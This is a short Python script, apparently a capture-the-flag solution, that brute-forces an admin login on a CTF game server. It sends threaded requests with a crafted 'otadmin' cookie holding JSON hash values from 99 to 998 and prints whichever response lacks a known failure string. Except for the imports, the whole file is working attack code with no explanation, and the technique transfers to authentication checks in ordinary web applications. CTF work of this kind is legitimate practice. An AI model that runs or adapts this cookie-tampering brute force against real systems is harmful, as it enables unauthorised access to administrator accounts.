#!/usr/bin/env python3
import requests
import threading
import time
import os
 
def brute(sol):
    data = {'otadmin': '{"hash": %s}' % sol}
    r = requests.get('http://gameserver.zajebistyc.tf/admin/login.php', cookies=data)
    if '0006464640640064000646464640006400640640646400' not in r.text:
        print('[+] Solution: ' + str(sol), flush=True)
        print(r.text)
        os._exit(1)
    else:
        pass
 
for i in range(99, 999):        
    thread1 = threading.Thread(target=brute, args=[i,])
    thread1.start()
    time.sleep(0.05)
